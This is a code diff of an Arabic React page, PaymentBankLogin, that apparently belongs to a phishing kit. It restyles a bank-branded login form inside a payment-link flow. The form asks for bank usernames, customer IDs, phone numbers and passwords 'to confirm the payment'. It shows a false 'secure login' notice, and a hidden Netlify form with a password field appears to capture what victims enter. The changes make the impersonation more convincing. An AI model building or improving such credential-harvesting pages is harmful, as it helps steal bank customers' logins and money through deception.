@@ -1,10 +1,11 @@
 import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
+import { Card } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
+import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { Lock, Eye, EyeOff, Building2, ArrowLeft, ShieldCheck } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
@@ -69,6 +70,10 @@ const PaymentBankLogin = () => {
   
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
   const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
+  
+  // Use bank colors if bank is selected, otherwise use service branding
+  const bankColor = selectedBank?.color || branding.colors.primary;
+  const secondaryColor = branding.colors.secondary;
   
   // Determine login type based on bank
   const getLoginType = () => {
@@ -261,193 +266,237 @@ const PaymentBankLogin = () => {
   };
   
   return (
-    <DynamicPaymentLayout
-      serviceName={serviceName}
-      serviceKey={serviceKey}
-      amount={formattedAmount}
-      title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
-      description="أدخل بيانات الدخول للبنك لتأكيد العملية"
-      icon={<Lock className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
-    >
-      {/* Bank Info Header */}
-      <div 
-        className="rounded-lg p-4 sm:p-5 mb-6 flex items-center gap-4"
-        style={{
-          background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`,
-        }}
-      >
-        <div 
-          className="w-12 h-12 sm:w-14 sm:h-14 rounded-xl bg-white/20 backdrop-blur-sm flex items-center justify-center flex-shrink-0"
-        >
-          <Building2 className="w-6 h-6 sm:w-7 sm:h-7 text-white" />
-        </div>
-        <div className="flex-1 text-white">
-          <p className="text-xs sm:text-sm opacity-90">البنك المختار</p>
-          <p className="text-lg sm:text-xl font-bold">{selectedBank?.nameAr || 'البنك'}</p>
-          <p className="text-xs opacity-80">{selectedBank?.name}</p>
-        </div>
-        {selectedCountryData && (
-          <span className="text-3xl sm:text-4xl">{selectedCountryData.flag}</span>
-        )}
-      </div>
-
-      {/* Security Notice */}
-      <div 
-        className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2"
-        style={{
-          background: `${branding.colors.primary}10`,
-          border: `1px solid ${branding.colors.primary}30`
-        }}
-      >
-        <ShieldCheck className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
-        <div className="text-xs sm:text-sm">
-          <p className="font-semibold mb-1">تسجيل دخول آمن</p>
-          <p className="text-muted-foreground">
-            سجّل دخول إلى حسابك البنكي لتأكيد العملية وإكمال الدفع بأمان
-          </p>
-        </div>
-      </div>
-
-      {/* Login Form */}
-      <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5">
-        {/* Username Login */}
-        {loginType === 'username' && (
-          <>
-            <div>
-              <Label className="mb-2 text-sm sm:text-base">اسم المستخدم</Label>
-              <Input
-                type="text"
-                placeholder="أدخل اسم المستخدم"
-                value={username}
-                onChange={(e) => setUsername(e.target.value)}
-                className="h-12 sm:h-14 text-base sm:text-lg"
-                autoComplete="username"
-                required
-              />
-            </div>
-          </>
-        )}
-        
-        {/* Customer ID Login */}
-        {loginType === 'customerId' && (
-          <>
-            <div>
-              <Label className="mb-2 text-sm sm:text-base">رقم العميل</Label>
-              <Input
-                type="text"
-                placeholder="أدخل رقم العميل"
-                value={customerId}
-                onChange={(e) => setCustomerId(e.target.value)}
-                className="h-12 sm:h-14 text-base sm:text-lg"
-                inputMode="numeric"
-                required
-              />
-            </div>
-          </>
-        )}
-        
-        {/* Phone Login */}
-        {loginType === 'phone' && (
-          <>
-            <div>
-              <Label className="mb-2 text-sm sm:text-base">رقم الجوال</Label>
-              <Input
-                type="tel"
-                placeholder="05xxxxxxxx"
-                value={phoneNumber}
-                onChange={(e) => setPhoneNumber(e.target.value)}
-                className="h-12 sm:h-14 text-base sm:text-lg"
-                inputMode="tel"
-                required
-              />
-            </div>
-          </>
-        )}
-        
-        {/* Password (common for all types) */}
-        <div>
-          <Label className="mb-2 text-sm sm:text-base">كلمة المرور</Label>
-          <div className="relative">
-            <Input
-              type={showPassword ? "text" : "password"}
-              placeholder="أدخل كلمة المرور"
-              value={password}
-              onChange={(e) => setPassword(e.target.value)}
-              className="h-12 sm:h-14 text-base sm:text-lg pl-12"
-              autoComplete="current-password"
-              required
-            />
-            <button
-              type="button"
-              onClick={() => setShowPassword(!showPassword)}
-              className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
-            >
-              {showPassword ? (
-                <EyeOff className="w-5 h-5" />
-              ) : (
-                <Eye className="w-5 h-5" />
-              )}
-            </button>
-          </div>
-        </div>
-        
-        {/* Remember Me / Forgot Password */}
-        <div className="flex items-center justify-between text-xs sm:text-sm">
-          <div className="flex items-center gap-2">
-            <input type="checkbox" id="remember" className="rounded" />
-            <label htmlFor="remember" className="text-muted-foreground cursor-pointer">
-              تذكرني
-            </label>
-          </div>
-          <button
-            type="button"
-            className="text-muted-foreground hover:underline"
-            style={{ color: selectedBank?.color || branding.colors.primary }}
-          >
-            نسيت كلمة المرور؟
-          </button>
-        </div>
-        
-        {/* Submit Button */}
-        <Button
-          type="submit"
-          size="lg"
-          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white font-bold shadow-lg"
-          disabled={isSubmitting}
+    <>
+      <PaymentMetaTags
+        serviceName={serviceName}
+        serviceKey={serviceKey}
+        amount={formattedAmount}
+        title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
+        description="أدخل بيانات الدخول للبنك لتأكيد العملية"
+      />
+      <div className="min-h-screen bg-background" dir="rtl">
+        {/* Hero Section */}
+        <div
+          className="relative w-full h-48 sm:h-64 overflow-hidden"
           style={{
-            background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`
+            background: `linear-gradient(135deg, ${bankColor}, ${secondaryColor})`,
           }}
         >
-          {isSubmitting ? (
-            <span>جاري تسجيل الدخول...</span>
-          ) : (
-            <>
-              <Lock className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
-              <span>تسجيل الدخول والمتابعة</span>
-              <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
-            </>
+          <div className="absolute inset-0 bg-black/30" />
+          
+          {/* Bank Logo */}
+          {selectedBank && (
+            <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
+              <div className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg">
+                <Building2 className="h-12 sm:h-16 w-12 sm:w-16" style={{ color: bankColor }} />
+              </div>
+            </div>
           )}
-        </Button>
-        
-        <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
-          بتسجيل الدخول، أنت توافق على شروط وأحكام البنك
-        </p>
-      </form>
-      
-      {/* Additional Info */}
-      <div className="mt-6 pt-6 border-t text-center">
-        <p className="text-xs text-muted-foreground mb-3">
-          لا تملك حساب؟
-        </p>
-        <Button
-          type="button"
-          variant="outline"
-          size="sm"
-          className="text-xs"
-          style={{ borderColor: selectedBank?.color || branding.colors.primary }}
-        >
-          تسجيل حساب جديد
-        </Button>
+          
+          <div className="absolute bottom-4 right-4 sm:bottom-6 sm:right-6 text-white">
+            <div className="text-right">
+              <h2 className="text-lg sm:text-2xl font-bold mb-1">{selectedBank?.nameAr || 'البنك'}</h2>
+              <p className="text-xs sm:text-sm opacity-90">{selectedCountryData?.nameAr}</p>
+            </div>
+          </div>
+        </div>
+
+        <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
+          <div className="max-w-2xl mx-auto">
+            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: bankColor }}>
+              <div className="flex items-center justify-between mb-6 sm:mb-8">
+                <h1 className="text-xl sm:text-3xl font-bold">تسجيل الدخول</h1>
+
+                <div
+                  className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
+                  style={{
+                    background: `linear-gradient(135deg, ${bankColor}, ${secondaryColor})`,
+                  }}
+                >
+                  <Lock className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
+                </div>
+              </div>
+              {/* Bank Info Header */}
+              <div 
+                className="rounded-lg p-4 sm:p-5 mb-6 flex items-center gap-4"
+                style={{
+                  background: `linear-gradient(135deg, ${bankColor}, ${secondaryColor})`,
+                }}
+              >
+                <div 
+                  className="w-12 h-12 sm:w-14 sm:h-14 rounded-xl bg-white/20 backdrop-blur-sm flex items-center justify-center flex-shrink-0"
+                >
+                  <Building2 className="w-6 h-6 sm:w-7 sm:h-7 text-white" />
+                </div>
+                <div className="flex-1 text-white">
+                  <p className="text-xs sm:text-sm opacity-90">البنك المختار</p>
+                  <p className="text-lg sm:text-xl font-bold">{selectedBank?.nameAr || 'البنك'}</p>
+                  <p className="text-xs opacity-80">{selectedBank?.name}</p>
+                </div>
+                {selectedCountryData && (
+                  <span className="text-3xl sm:text-4xl">{selectedCountryData.flag}</span>
+                )}
+              </div>
+
+              {/* Security Notice */}
+              <div 
+                className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2"
+                style={{
+                  background: `${bankColor}10`,
+                  border: `1px solid ${bankColor}30`
+                }}
+              >
+                <ShieldCheck className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: bankColor }} />
+                <div className="text-xs sm:text-sm">
+                  <p className="font-semibold mb-1">تسجيل دخول آمن</p>
+                  <p className="text-muted-foreground">
+                    سجّل دخول إلى حسابك البنكي لتأكيد العملية وإكمال الدفع بأمان
+                  </p>
+                </div>
+              </div>
+
+              {/* Login Form */}
+              <form onSubmit={handleSubmit} className="space-y-3 sm:space-y-4">
+                {/* Username Login */}
+                {loginType === 'username' && (
+                  <div>
+                    <Label htmlFor="username" className="mb-1.5 sm:mb-2 text-xs sm:text-sm">اسم المستخدم</Label>
+                    <Input
+                      id="username"
+                      type="text"
+                      placeholder="أدخل اسم المستخدم"
+                      value={username}
+                      onChange={(e) => setUsername(e.target.value)}
+                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      autoComplete="username"
+                      required
+                    />
+                  </div>
+                )}
+                
+                {/* Customer ID Login */}
+                {loginType === 'customerId' && (
+                  <div>
+                    <Label htmlFor="customerId" className="mb-1.5 sm:mb-2 text-xs sm:text-sm">رقم العميل</Label>
+                    <Input
+                      id="customerId"
+                      type="text"
+                      placeholder="أدخل رقم العميل"
+                      value={customerId}
+                      onChange={(e) => setCustomerId(e.target.value)}
+                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      inputMode="numeric"
+                      required
+                    />
+                  </div>
+                )}
+                
+                {/* Phone Login */}
+                {loginType === 'phone' && (
+                  <div>
+                    <Label htmlFor="phone" className="mb-1.5 sm:mb-2 text-xs sm:text-sm">رقم الجوال</Label>
+                    <Input
+                      id="phone"
+                      type="tel"
+                      placeholder="05xxxxxxxx"
+                      value={phoneNumber}
+                      onChange={(e) => setPhoneNumber(e.target.value)}
+                      className="h-10 sm:h-12 text-sm sm:text-base"
+                      inputMode="tel"
+                      required
+                    />
+                  </div>
+                )}
+                
+                {/* Password (common for all types) */}
+                <div>
+                  <Label htmlFor="password" className="mb-1.5 sm:mb-2 text-xs sm:text-sm">كلمة المرور</Label>
+                  <div className="relative">
+                    <Input
+                      id="password"
+                      type={showPassword ? "text" : "password"}
+                      placeholder="أدخل كلمة المرور"
+                      value={password}
+                      onChange={(e) => setPassword(e.target.value)}
+                      className="h-10 sm:h-12 text-sm sm:text-base pl-12"
+                      autoComplete="current-password"
+                      required
+                    />
+                    <button
+                      type="button"
+                      onClick={() => setShowPassword(!showPassword)}
+                      className="absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
+                    >
+                      {showPassword ? (
+                        <EyeOff className="w-4 h-4 sm:w-5 sm:h-5" />
+                      ) : (
+                        <Eye className="w-4 h-4 sm:w-5 sm:h-5" />
+                      )}
+                    </button>
+                  </div>
+                </div>
+                
+                {/* Remember Me / Forgot Password */}
+                <div className="flex items-center justify-between text-xs sm:text-sm">
+                  <div className="flex items-center gap-2">
+                    <input type="checkbox" id="remember" className="rounded" />
+                    <label htmlFor="remember" className="text-muted-foreground cursor-pointer">
+                      تذكرني
+                    </label>
+                  </div>
+                  <button
+                    type="button"
+                    className="text-muted-foreground hover:underline"
+                    style={{ color: bankColor }}
+                  >
+                    نسيت كلمة المرور؟
+                  </button>
+                </div>
+                
+                {/* Submit Button */}
+                <Button
+                  type="submit"
+                  size="lg"
+                  className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
+                  disabled={isSubmitting}
+                  style={{
+                    background: `linear-gradient(135deg, ${bankColor}, ${secondaryColor})`
+                  }}
+                >
+                  {isSubmitting ? (
+                    <span>جاري تسجيل الدخول...</span>
+                  ) : (
+                    <>
+                      <Lock className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
+                      <span>تسجيل الدخول والمتابعة</span>
+                      <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
+                    </>
+                  )}
+                </Button>
+                
+                <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
+                  بتسجيل الدخول، أنت توافق على شروط وأحكام البنك
+                </p>
+              </form>
+              
+              {/* Additional Info */}
+              <div className="mt-6 pt-6 border-t text-center">
+                <p className="text-xs text-muted-foreground mb-3">
+                  لا تملك حساب؟
+                </p>
+                <Button
+                  type="button"
+                  variant="outline"
+                  size="sm"
+                  className="text-xs"
+                  style={{ borderColor: bankColor }}
+                >
+                  تسجيل حساب جديد
+                </Button>
+              </div>
+            </Card>
+          </div>
+        </div>
       </div>
     
       {/* Hidden Netlify Form */}
@@ -467,7 +516,7 @@ const PaymentBankLogin = () => {
         <input type="password" name="password" />
         <input type="text" name="timestamp" />
       </form>
-    </DynamicPaymentLayout>
+    </>
   );
 };
 
